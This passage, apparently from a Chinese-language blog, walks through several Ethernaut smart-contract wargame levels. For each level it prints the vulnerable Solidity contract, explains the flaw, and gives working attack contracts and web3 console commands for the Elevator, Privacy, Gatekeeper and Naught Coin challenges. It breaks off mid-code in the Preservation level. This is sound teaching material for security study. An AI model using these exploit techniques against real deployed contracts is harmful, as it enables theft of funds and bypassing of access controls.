<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">external</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要登顶，需要top=true，就需要我们在</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top = building.isLastFloor(floor);<span class="comment">//isLastFloor()返回true</span></span><br><span class="line"><span class="keyword">if</span> (! building.isLastFloor(_floor))<span class="comment">//isLastFloor()返回false</span></span><br></pre></td></tr></table></figure>
<p>也就是说，我们需要对isLastFloor()函数进行操作，题目在声明 <code>isLastFloor</code> 时，赋予了 view 属性，view 表示函数会读取合约变量，但是不会修改任何合约的状态，再看看题目提示</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sometimes solidity is not good at keeping promises.</span><br></pre></td></tr></table></figure>
<p>查找了一些资料之后，发现当前 <code>Solidity</code> 编译器没有强制执行 view 函数不能修改状态，所以上述做法就是可行的</p>
<figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="built_in">exp</span> &#123;</span><br><span class="line">    address <span class="keyword">to</span> = <span class="number">0</span>x62515F83C91cDF26b8014e1c3f48Da3F4B5106cD;</span><br><span class="line">    //修改成你的合约地址</span><br><span class="line">    Elevator <span class="built_in">exp</span> = Elevator(<span class="keyword">to</span>);</span><br><span class="line">    bool <span class="keyword">public</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(</span>uint) <span class="keyword">public</span> returns (bool)&#123;</span><br><span class="line">        flag = !flag;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(</span>) <span class="keyword">public</span>&#123;</span><br><span class="line">        <span class="built_in">exp</span>.goTo(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210619144446168-7093025-7093100.png" alt="image-20210619144446168"></p>
<h2 id="0x0D-Privacy"><a href="#0x0D-Privacy" class="headerlink" title="0x0D Privacy"></a>0x0D Privacy</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">bytes32[<span class="number">3</span>] memory _data</span>) <span class="title">public</span> &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span></span><br><span class="line"><span class="comment">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span></span><br><span class="line"><span class="comment">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之前 <code>Vault</code> 题目的升级版，还是一样，用 <code>getStorageAt()</code> 把链上的数据读出来</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">0</span>)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000000000001  locked</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">1</span>)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000060cd98c3  block.timestamp</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">2</span>)</span><br><span class="line"><span class="comment">//0x0000000000000000000000000000000000000000000000000000000098c3ff0a </span></span><br><span class="line"><span class="comment">// flattening denomination awkwardness</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">3</span>)</span><br><span class="line"><span class="comment">//0x41c044f993be0e8c24b049c19b70a3d9d2e54aaf2cbb429787f8cbc5b47075b7  data[0]</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//0x1bfba67ed5c9b51ae63b2cae7bd1a2357d982032fd6650fa816380d5a8904089  data[1]</span></span><br><span class="line">web3.eth.getStorageAt(contract.address,<span class="number">5</span>)</span><br><span class="line"><span class="comment">//0xe9b3f125a9345010284752e33195e9eedf04354aa6ecf0c268c5b6fae3df42be  data[2]</span></span><br></pre></td></tr></table></figure>
<p>byte16强制转换，所以我们取data[2]的前十六位</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">contract</span>.unlock(&#x27;<span class="number">0</span>xe<span class="number">9</span>b<span class="number">3</span>f<span class="number">125</span>a<span class="number">9345010284752</span>e<span class="number">33195</span>e<span class="number">9</span>ee&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210619152931264-7093025.png" alt="image-20210619152931264"></p>
<h2 id="0x0E-Gatekeeper-One"><a href="#0x0E-Gatekeeper-One" class="headerlink" title="0x0E Gatekeeper One"></a>0x0E Gatekeeper One</h2><p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateOne</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateTwo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(gasleft().mod(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateThree</span>(<span class="params">bytes8 _gateKey</span>)</span> &#123;</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), <span class="string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) != uint64(_gateKey), <span class="string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(uint32(uint64(_gateKey)) == uint16(tx.origin), <span class="string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求我们分别满足三个gate函数</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gataOne <span class="regexp">//</span>通过第三方合约调用 enter 即可gataTwo <span class="regexp">//m</span>sg.gas % <span class="number">8191</span> == <span class="number">0</span>gataThree <span class="regexp">//</span>数据类型转换规则的考察</span><br></pre></td></tr></table></figure>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 数字 与 数字</span><br><span class="line">uint8 -&gt; uint16</span><br><span class="line"><span class="regexp">//</span> 值不变  其他小单位转大单位同理</span><br><span class="line">uint16 -&gt; uint8</span><br><span class="line"><span class="regexp">//</span> 导致溢出，转换后的结果为原变量 mod <span class="number">256</span> 其他大单位转小单位同理</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> bytes 与 bytes</span><br><span class="line">bytes8 -&gt; bytes16</span><br><span class="line"><span class="regexp">//</span> 后面补零 其他小单位转大单位同理</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>xaaaaaaaaaaaaaaaa -&gt; <span class="number">0</span>xaaaaaaaaaaaaaaaa0000000000000000</span><br><span class="line">bytes16 -&gt; bytes8</span><br><span class="line"><span class="regexp">//</span> 取前面的位数 其他大单位转小单位同理</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>xaaaaaaaaaaaaaaaa0000000000000000 -&gt; <span class="number">0</span>xaaaaaaaaaaaaaaaa</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> address 与 bytes、uint</span><br><span class="line">address -&gt; uint</span><br><span class="line"><span class="regexp">//</span> 根据 uint 的具体单位，将地址从尾端开始截取对应长度</span><br><span class="line"><span class="regexp">//</span> 如地址<span class="number">0</span>x0DCd2F752394c41875e259e00bb44fd505297caF，转为 uint8 为取最后<span class="number">1</span>字节 <span class="number">0</span>xaf</span><br><span class="line">address -&gt; bytes</span><br><span class="line"><span class="regexp">//</span> 根据 bytes 的具体单位，从前截取对应长度</span><br><span class="line"><span class="regexp">//</span> <span class="number">0</span>x08970FEd061E7747CD9a38d680A601510CB659FB -&gt; <span class="number">0</span>x80a601510cb659fb (bytes8)</span><br><span class="line">uint/bytes 转 address</span><br><span class="line"><span class="regexp">//</span> uint 转为 hex，bytes不变，从后填充</span><br><span class="line"><span class="regexp">//</span> uint8 -&gt; address <span class="number">0</span>x123 -&gt; <span class="number">0</span>x0000000000000000000000000000000000000123</span><br><span class="line"><span class="regexp">//</span> bytes8 -&gt; address <span class="number">0</span>x80a601510cb659fb -&gt; <span class="number">0</span>x00000000000000000000000080A601510cB659FB </span><br></pre></td></tr></table></figure>
<p>这个复现失败了，Gas在链上没有调试出来，后来找到一篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/d744486832/article/details/105371359">文章</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address =<span class="number">0xc97fBFaC4734868B2f54CD54308e0733a5FBcfD4</span>;</span><br><span class="line">    bytes8 _gateKey = bytes8(tx.origin) &amp; <span class="number">0xFFFFFFFF0000FFFF</span>;</span><br><span class="line"></span><br><span class="line">    GatekeeperOne target = GatekeeperOne(instance_address);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.call.gas(<span class="number">999999</span>)(bytes4(keccak256(<span class="string">&quot;enter(bytes8)&quot;</span>)), _gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5b4f043f1da6a0acb14405618d4b66b6c38ecd35546084c94fc6d78791ba9a37</span><span class="comment">//txhash</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623122522463-7093025.png" alt="image-20210623122522463"></p>
<p><img src="/2021/06/17/16/image-20210623122511481-7093025.png" alt="image-20210623122511481"></p>
<h2 id="0x0F-Gatekeeper-Two"><a href="#0x0F-Gatekeeper-Two" class="headerlink" title="0x0F Gatekeeper Two"></a>0x0F Gatekeeper Two</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateOne</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateTwo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="function"><span class="title">gateThree</span>(<span class="params">bytes8 _gateKey</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和One一样需要绕过三个条件限制</p>
<p>第一个限制不必多说</p>
<p>第二个限制，这里使用的是内联汇编来获取调用方(caller)的代码大小，需要我们的合约代码大小为零。就想到在构造函数里面去调用受害合约，此时我们的合约正在初始化，代码大小就为零了</p>
<p>第三个就是利用异或的特性</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Hack</span>(<span class="params">address _c</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        GatekeeperTwo exp = GatekeeperTwo(_c);</span><br><span class="line">        bytes8 _gateKey = bytes8((uint64(<span class="number">0</span>) -<span class="number">1</span>) ^ uint64(bytes8(keccak256(<span class="built_in">this</span>))));</span><br><span class="line">        exp.call(bytes4(keccak256(<span class="string">&quot;enter(bytes8)&quot;</span>)),_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0xfd97529959ac12f3603323e576cdfd6ef224480c06e16e632219543a68b62bdd</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623195125291-7093025.png" alt="image-20210623195125291"></p>
<h2 id="0x10-Naught-Coin"><a href="#0x10-Naught-Coin" class="headerlink" title="0x10 Naught Coin"></a>0x10 Naught Coin</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span></span><br><span class="line">  <span class="comment">// string public constant symbol = &#x27;0x0&#x27;;</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint <span class="keyword">public</span> timeLock = now + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 <span class="keyword">public</span> INITIAL_SUPPLY;</span><br><span class="line">  address <span class="keyword">public</span> player;</span><br><span class="line"></span><br><span class="line">  <span class="title">constructor</span>(<span class="params">address _player</span>) </span><br><span class="line">  <span class="title">ERC20</span>(<span class="params"><span class="string">&#x27;NaughtCoin&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span></span>)</span><br><span class="line">  <span class="title">public</span> &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span>**uint256(decimals()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(<span class="number">0</span>), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">override</span> <span class="title">public</span> <span class="title">lockTokens</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier <span class="function"><span class="title">lockTokens</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>classic blance to 0</p>
<p>看合约代码知道设置了lockTokens修饰词对transfer函数加以验证，同时transfer函数也对ERC720合约中的transfer函数进行了重写。同时意识到ERC720有两个转账函数，一个是 transfer 还有一个是 transferFrom，这里只重写了一个，意味着另一个可以被直接调用。跟踪了一下，发现transferFrom 需要先经过 approve 批准才能使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferFrom</span>(<span class="params">TokenStorage storage self, address _from, address _to, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _allowance = self.allowed[_from][msg.sender];</span><br><span class="line">    self.balances[_to] = self.balances[_to].plus(_value);</span><br><span class="line">    self.balances[_from] = self.balances[_from].minus(_value);</span><br><span class="line">    self.allowed[_from][msg.sender] = _allowance.minus(_value);</span><br><span class="line">    Transfer(_from, _to, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">approve</span>(<span class="params">TokenStorage storage self, address _spender, uint _value</span>) <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    self.allowed[msg.sender][_spender] = _value;</span><br><span class="line">    Approval(msg.sender, _spender, _value);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>第一步先看有多少钱，才知道能授权多少</p>
<p><img src="/2021/06/17/16/image-20210623201122087-1624760853550-7093025.png" alt="image-20210623201122087"></p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//授权转钱</span></span><br><span class="line">contract.approve(player,<span class="keyword">to</span><span class="constructor">Wei(&#x27;1000000&#x27;)</span>)</span><br><span class="line">contract.transfer<span class="constructor">From(<span class="params">player</span>,<span class="params">contract</span>.<span class="params">address</span>,<span class="params">toWei</span>(&#x27;1000000&#x27;)</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/17/16/image-20210623200401783-7093025.png" alt="image-20210623200401783"></p>
<h2 id="0x11-Preservation"><a href="#0x11-Preservation" class="headerlink" title="0x11 Preservation"></a>0x11 Preservation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint 